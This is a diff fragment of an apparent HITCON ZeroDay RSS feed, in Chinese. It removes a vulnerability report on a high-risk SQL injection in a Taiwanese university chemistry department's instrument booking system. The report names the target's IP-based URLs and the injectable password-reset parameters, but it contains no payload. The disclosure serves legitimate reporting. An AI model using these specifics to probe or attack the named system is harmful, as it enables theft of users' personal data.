-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7193/attachments/00b042efa8ef693adb5d29c45bd88610" width="320"/>
-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7193/attachments/c8980e9deab6478c30938392fa1c2686" width="320"/>
-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7193/attachments/46380db52b7d7832c741374c57e156f0" width="320"/>
-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7193/attachments/d2e6f648cb56684a830c0423fa260405" width="320"/>
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   留言討論
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="comments-block" id="comments_block">
-    </div>
-    <div class="login-and-comment">
-     <a href="/auth/login">
-      登入後留言
-     </a>
-    </div>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   聯絡組織
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="input-comment">
-     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/4172">
-      <i class="far fa-envelope">
-      </i>
-      發送私人訊息
-     </a>
-     <div class="remind-text">
-      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
-     </div>
-    </div>
-   </div>
-  </div>
- </section>
-</div>
-</description><pubDate>Tue, 11 Jan 2022 11:47:26 GMT</pubDate></item><item><title>國立中山大學化學系 儀器預約平台 資料庫注入漏洞</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00027</link><description><div class="container">
- <h2 class="always-not-there">
-  Vulnerability Detail Report
- </h2>
- <section class="vul-detail-section overview">
-  <h3 class="always-not-there">
-   Vulnerability Overview
-  </h3>
-  <div class="section-content overview">
-   <ul>
-    <li class="zdid col-risk-high-pseud-b">
-     <span class="label">
-      ZDID:
-     </span>
-     <span class="value">
-      ZD-2022-00027
-     </span>
-    </li>
-    <li class="vendor">
-     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/68">
-      <i class="far fa-envelope">
-      </i>
-      發信
-     </a>
-     <span class="label">
-      Vendor:
-     </span>
-     <span class="value tx-overflow-ellipsis">
-      國立中山大學
-     </span>
-    </li>
-    <li class="title">
-     <span class="label">
-      Title:
-     </span>
-     <span class="value">
-      國立中山大學化學系 儀器預約平台 資料庫注入漏洞
-     </span>
-    </li>
-    <li class="intro">
-     <span class="label">
-      Introduction:
-     </span>
-     <span class="value">
-      國立中山大學化學系 儀器預約平台 存在資料庫注入漏洞
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   處理狀態
-  </h3>
-  <div class="section-content status">
-   <h4 class="always-not-there">
-    目前狀態
-   </h4>
-   <div class="status-label col-status-200-tx">
-    公開
-   </div>
-   <div class="status-descr">
-    Last Update : 2022/03/27
-   </div>
-   <ul class="zdui-status-timeline stat-tn-risk-high">
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       新提交
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已審核
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已通報
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node warning">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未回報修補狀況
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未複測
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       公開
-      </span>
-     </div>
-    </li>
-   </ul>
-   <h4 class="always-not-there">
-    處理歷程
-   </h4>
-   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
-   </div>
-   <ul class="status-log-list" id="vul-status-log-list">
-    <li>
-     <span class="log-date">
-      2022/01/11 03:27:44
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由 neverleave0916 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/01/13 01:33:09
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由 neverleave0916 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/16 23:04:30
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:22:07
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      修補中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:22:07
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      修補中 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/03/27 03:00:04
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      公開 (由 HITCON ZeroDay 平台自動更新)
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   詳細資料
-  </h3>
-  <div class="section-content info">
-   <ul>
-    <li>
-     ZDID：ZD-2022-00027
-    </li>
-    <li>
-     通報者：neverleave0916 (
-     <a href="/user/neverleave0916">
-      neverleave0916
-     </a>
-     )
-    </li>
-    <li>
-     風險：高
-    </li>
-    <li>
-     類型：資料庫注入攻擊 (SQL Injection)
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   參考資料
-  </h3>
-  <div class="section-content url">
-   <div>
-    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
-    <br/>
-    <br/>
-    漏洞說明： OWASP - SQL Injection
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection
-    <br/>
-    <br/>
-    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
-    <br/>
-    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
-    <br/>
-    <br/>
-    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
-    <br/>
-    https://cwe.mitre.org/data/definitions/89.html
-    <br/>
-    <br/>
-    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
-   </div>
-   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
-    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   相關網址
-  </h3>
-  <div class="section-content url">
-   <div class="urls">
-    http://140.117.34.13/booking/admin_login.php
-    <br/>
-    http://140.117.34.13/booking/admin_password_forget.php
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   敘述
-  </h3>
-  <div class="section-content zdui-md-content" id="detail">
-   <div>
-    <p>
-     此平台在登入界面並未發現漏洞，但在忘記密碼之網址中發現可進行injection之漏洞，其參數為aid與T，將導致資料庫資訊外洩。
-    </p>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   擷圖
-  </h3>
-  <div class="section-content screenshot">
-   <ul>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7190/attachments/2064c4903e8ef89cd668fea202d8a848" width="320"/>
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   留言討論
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="comments-block" id="comments_block">
-    </div>
-    <div class="login-and-comment">
-     <a href="/auth/login">
-      登入後留言
-     </a>
-    </div>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   聯絡組織
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="input-comment">
-     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/68">
-      <i class="far fa-envelope">
-      </i>
-      發送私人訊息
-     </a>
-     <div class="remind-text">
-      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
-     </div>
-    </div>
-   </div>
-  </div>
- </section>
-</div>
-</description><pubDate>Tue, 11 Jan 2022 03:27:44 GMT</pubDate></item></channel></rss>
+</description><pubDate>Tue, 11 Jan 2022 17:55:37 GMT</pubDate></item></channel></rss>
